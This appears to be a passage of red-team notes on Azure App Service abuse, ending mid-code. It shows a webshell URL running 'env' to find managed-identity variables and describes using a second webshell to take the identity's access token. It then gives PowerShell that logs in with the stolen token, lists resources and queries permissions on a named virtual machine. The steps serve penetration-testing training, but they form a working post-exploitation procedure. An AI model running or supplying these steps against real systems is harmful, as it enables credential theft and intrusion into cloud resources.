# Initial Access via App Service Abuse

If you exploited an Azure App Service with file upload or RCE when you executed as `env` command on the app you can find variables to detect that the app server runs via managed identity. The variables are listed below;
  - `IDENTITY_HEADER`
  - `IDENTITY_ENDPOINT`

<!---asdasd -->
![test](/img/app_server_abuse.png "Initial Access via App Service Abuse").


1. If the app service uses a Managed Identity, we may have the ability to have interesting permissions on other Azure resources.
2. After compromising an app service, we can request access tokens for the managed identity.
3. If the app service contains environment variables `IDENTITY_HEADER` and `IDENTITY_ENDPOINT`, it has a managed identity.
    ```
    http://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env 
    ```
4. Get the access token for the managed identity using another webshell
5. Check the resources available to the managed identity (using the access token and client ID)
    ```powershell
    Connect-AzAccount -AccessToken $token -AccountId <clientID> 
    Get-AzResource
    ```
6. Check the permissions of the managed identity on the virtual machine from above
    ```powershell
    $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-
    d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/provide
    rs/Microsoft.Authorization/permissions?api-version=2015-07-01'
    $RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
    'Authorization' = "Bearer $Token"
    }
    }
    (Invoke-RestMethod @RequestParams).value 

